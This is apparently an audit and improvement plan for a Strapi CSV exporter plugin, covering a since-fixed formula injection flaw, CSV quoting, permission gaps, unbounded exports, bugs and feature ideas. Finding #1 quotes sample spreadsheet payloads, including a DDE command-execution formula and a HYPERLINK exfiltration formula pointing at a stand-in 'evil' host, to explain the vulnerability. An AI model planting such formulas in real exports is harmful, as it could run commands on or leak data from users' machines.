# strapi-plugin-csv-exporter — Audit & Improvement Plan

Analysis of the plugin (server + admin), cross-checked against the installed `@strapi/*`
sources. Findings are grouped by severity, followed by low-effort feature ideas and a
suggested order of work.

---

## 🔴 Security findings

### ~~1. CSV formula injection~~ — ✅ FIXED

Fixed in `server/src/utils/csv.ts` (`toCSVValue`). Values starting with `=`, `+`, `-`, `@`,
tab or CR are prefixed with `'`; plain numbers (`-5`, `+3.2`, `1e-4`) are exempt so numeric
columns stay clean. Opt out with `escapeFormulas: false`. Covered by `csv.test.ts`.

<details>
<summary>Original finding — <code>server/src/services/service.ts:194</code></summary>

The CSV is hand-built and values are never neutralized. Any content editor who puts
`=cmd|'/c calc'!A0`, `@SUM(...)`, `+HYPERLINK(...)`, or `-2+3` into a text field gets that
executed/rendered as a formula when the export is opened in Excel/LibreOffice/Sheets.
Classic exfiltration vector (`=HYPERLINK("http://evil/"&A1,"click")`) — and the whole point
of the plugin is that these files get opened in a spreadsheet.

**Fix:** prefix values starting with `=`, `+`, `-`, `@`, `\t`, `\r` with `'` (or wrap and
prefix), behind a config flag if an opt-out is wanted.

</details>

### ~~2. Broken CSV quoting~~ — ✅ FIXED

Fixed in `server/src/utils/csv.ts` (`toCSVValue`). Fields containing the delimiter, `"`, `\n`
or `\r` are quoted and inner quotes doubled, per RFC 4180. Row separator also switched from
`\n` to `\r\n`. Covered by `csv.test.ts`.

<details>
<summary>Original finding — <code>server/src/services/service.ts:194</code></summary>

```js
return value.includes(',') ? `"${value}"` : value;
```

- Embedded `"` is never doubled → `He said "hi", ok` produces a field parsers can't read.
- Embedded `\n` / `\r` (any richtext/textarea field) is never quoted → **rows split
  mid-record and the file silently misaligns**. Data-integrity bug, not cosmetic.

**Fix:** RFC 4180 escaping (quote if the value contains `,`, `"`, `\n`, `\r`; double
internal quotes) — or simply always quote.

</details>

### 3. Permission model is coarse — `server/src/routes/admin.ts`

The only check is `plugin::csv-exporter.usage`. A user with that permission can export
**every configured content type in full**, regardless of their Content-Manager read
permissions on those collections, and regardless of field-level permissions. Grant an intern
"export" and they can pull the entire user table if it is in the config.

Additionally `strapi.documents().findMany()` bypasses `sanitizeOutput`, so `private: true`
fields and password hashes are returned raw if someone lists them in `columns`.

**Fix options:** additionally assert `plugin::content-manager.explorer.read` on the target
UID, and/or run results through `strapi.contentAPI.sanitize.output` / `sanitizeOutput` with
the requesting user's ability. At minimum, document this loudly in the README.

### 4. Unbounded export — `server/src/services/service.ts:148`

Confirmed in `@strapi/core/dist/services/document-service/repository.js:248` that `findMany`
applies **no default limit** — it passes straight to `strapi.db.query`. `downloadCSV` calls
it with no `limit`, then builds the entire CSV as one concatenated JS string in memory.
A 500k-row collection → OOM / event-loop stall. Any authenticated exporter can trigger it
repeatedly.

`getTableData` also accepts an unbounded `limit` query param (no clamp).

**Fix:** batch with `limit`/`offset` and stream to the response (`ctx.body = stream`), plus a
configurable `maxRows` and a clamp on `limit`.

---

## 🟠 Correctness bugs

### 5. `ignore` is undefined by default → hard 500 — `server/src/utils/data-format.ts:90`

`options.ignore.includes(c)` has no fallback. The README documents `ignore` as optional
(default `[]`), but **no default is ever applied**: `server/src/config/index.ts` registers
defaults under `plugin::csv-exporter`, while the service reads the user's
`config/csv-exporter.ts` file via `strapi.config.get('csv-exporter')`. Different namespaces.
Anyone who follows the Quick Start and omits `ignore` gets a `TypeError` → 500 on both the
table and the download. `dateFormat` / `timeZone` are guarded with `??`; `ignore` is not.

Same root cause: **`config.validator()` is dead code — there is zero config validation**, and
a missing `config/csv-exporter.ts` throws on destructuring with an unhelpful 500.

### 6. Non-localized collections export empty in multi-locale projects — `service.ts:89, 151`

The locale is applied as `filters: { locale }` whenever `locales.length > 1`. Confirmed in
`@strapi/i18n/dist/server/register.js:43` that Strapi adds a `locale` attribute to **all**
content types (`private` when not localized) — it is `NULL` for non-localized rows. So in any
project with ≥2 locales, exporting a non-localized collection type filters on
`locale = 'de'` and returns **zero rows**.

**Fix:** pass `locale` as a top-level Document Service param (the i18n middleware ignores it
for non-localized types), gated on `isLocalizedContentType`.

### 7. Row count ignores filters and status — `service.ts:107`

`count()` is called with only the locale filter — not `validatedFilters`, not `status`. Any
configured `filter` makes the pagination total wrong (phantom pages, wrong "total rows").

### 8. Columns silently dropped from the CSV

`columns` are derived from `Object.keys()` of the **currently visible page**
(`service.ts:100-105`), and `downloadCSV` then filters the full dataset's keys by the
`sortOrder` the client built from that page (`service.ts:169`). A field that happens to be
`null` on page 1 never enters `sortOrder` → **it is missing from the export entirely**, with
no warning. Columns should come from the config, not from sampled data.

### 9. `sortOrder` is unvalidated → 500 — `service.ts:132`

- Delete every column in the UI → no `sortOrder` params → `undefined.includes` → 500.
- Strapi's qs `arrayLimit` is 100 (`@strapi/core/dist/middlewares/query.js:11`); >100 columns
  → qs returns an **object**, not an array → 500.
- If a single value is sent, `String.includes` does substring matching instead of exact.

### 10. `ctx.badRequest` returns 204, not 400

`getTableData` / `downloadCSV` do `return ctx.badRequest(...)`. Traced:
`@strapi/core/.../koa.js:19` sets `status` + `body` and returns **undefined**; the controller
then does `ctx.body = undefined`, and Koa's body setter (`koa/lib/response.js:141`) resets the
status to **204** and strips the body. An invalid `uid` yields an empty 204 and the admin UI
just shows nothing. The controller should not blindly assign `ctx.body`.

### 11. Download bypasses token refresh — `admin/src/pages/HomePage.tsx:112-135`

The manual `fetch` with `Bearer ${token}` from `useAuth` skips Strapi's fetch client, which
now does **automatic refresh + retry on 401** (`getFetchClient.js`, `withTokenRefresh`). On a
long-open admin tab the download will 401 while every other request silently recovers. The
code comment ("strapi get always processes with json") is out of date —
`get(url, { responseType: 'blob' })` is supported (typed in `getFetchClient.d.ts`).

### 12. i18n plugin is a hard dependency — `service.ts:35, 84, 145`

`strapi.plugin('i18n').service('locales')` is unguarded in all three endpoints. If i18n is
disabled, the plugin is entirely broken (500 on the dropdown = blank page). `getDefaultLocale`
in `utils/locale.ts` *is* guarded — the services are not.

### 13. Smaller ones

- `text/csv` sent without `charset=utf-8`, and no UTF-8 BOM → **umlauts are mangled in
  Excel** (relevant given the `dd.MM.yyyy` / Europe/Berlin defaults).
- Date-only (`2024-01-15`) and time-only fields don't match the ISO regex
  (`data-format.ts:213`) → `dateFormat` is not applied to them.
- `row[column] || '-'` in `StrapiTable.tsx` renders `0` and `false` as `-`.
- Objects (JSON fields, components) become `[object Object]` via `.toString()`.
- `uid.includes(type)` in `getDropdownValues` (`service.ts:22`) is substring matching —
  an `api::post.post` config also matches `api::post.post-archive`, which then fails
  `config[uid]` at export time.
- `Content-Disposition` filename is hardcoded `export.csv` server-side; only the client
  renames it.
- Missing `key` on the `<Typography>...</Typography>` ellipsis elements in `StrapiTable.tsx`.
- Hardcoded `'Europe/Berlin'` fallback in `data-format.ts:93` contradicts the documented UTC
  default (unreachable, but misleading).
- No tests, no CI, no ESLint config (there is an `.eslintignore` with nothing to ignore for).

---

## 💡 Easy, low-impact features

Ordered by value-to-effort:

1. **Delimiter + BOM config** (`delimiter: ',' | ';' | '\t'`, `bom: true`). Nearly one line,
   fixes the #1 complaint of every CSV plugin (German/French Excel wants `;`).
2. **Custom column labels** — `columnLabels: { createdAt: 'Created On' }` instead of the auto
   `split('_')` → Title Case. Trivial, immediately useful.
3. **Configurable sort** — `sort: 'createdAt:desc'` in config. Currently hardcoded `id:asc`
   (`data-format.ts:70`).
4. **Re-add a removed column** — deleting a column is one-way today; the only escape is
   "Reset All Columns". A checkbox/toggle list (or an "add back" chip row) is a small UI
   change with a real UX payoff.
5. **Persist column order + selection per content type in `localStorage`** — survives page
   reloads; ~15 lines in `HomePage.tsx`.
6. **Loading state on the Download button** — large exports currently look frozen. Also show
   the row count that will be exported next to the button.
7. **`status` (draft/published) toggle in the UI**, defaulting to the config value.
   Config-only today.
8. **Hide the locale dropdown for non-localized content types** — pairs naturally with fixing
   #6.
9. **Actually use the i18n scaffolding** — `translations/en.json` and `getTranslation` exist
   but every UI string is hardcoded. Wiring up `formatMessage` unlocks community translations
   for free.
10. **Config validation at bootstrap** — warn on unknown UIDs, unknown column names
    (checkable against `strapi.contentTypes[uid].attributes`), and private/password fields.
    Turns today's runtime 500s into a clear startup log line.

---

## Suggested order of work

**Phase 1 — ship as a patch (bug/security)**
~~CSV escaping + injection guard (#1, #2)~~ ✅ → `ignore` default crash (#5) → `sortOrder`
validation (#9) → `ctx.badRequest` / 204 (#10) → i18n guard (#12) → BOM + charset (#13).

**Phase 2 — correctness (minor version)**
locale handling as a Document Service param (#6) → count with filters (#7) → columns from
config instead of sampled data (#8) → download via `responseType: 'blob'` (#11).

**Phase 3 — scale & access control**
batched/streamed export with `maxRows` (#4) → per-content-type permission check + output
sanitization (#3). #3 is potentially breaking for existing users, so it belongs behind a
config flag or a major bump.

**Phase 4 — features**
The list above, starting with delimiter / labels / sort (config-only, no UI risk).

**Alongside Phase 1:** ~~add a minimal Vitest setup~~ ✅ — `vitest.config.ts`, `npm test`,
first suite in `server/src/utils/csv.test.ts`. `restructureData` and `validateFilter` are
still untested and are the next obvious candidates.
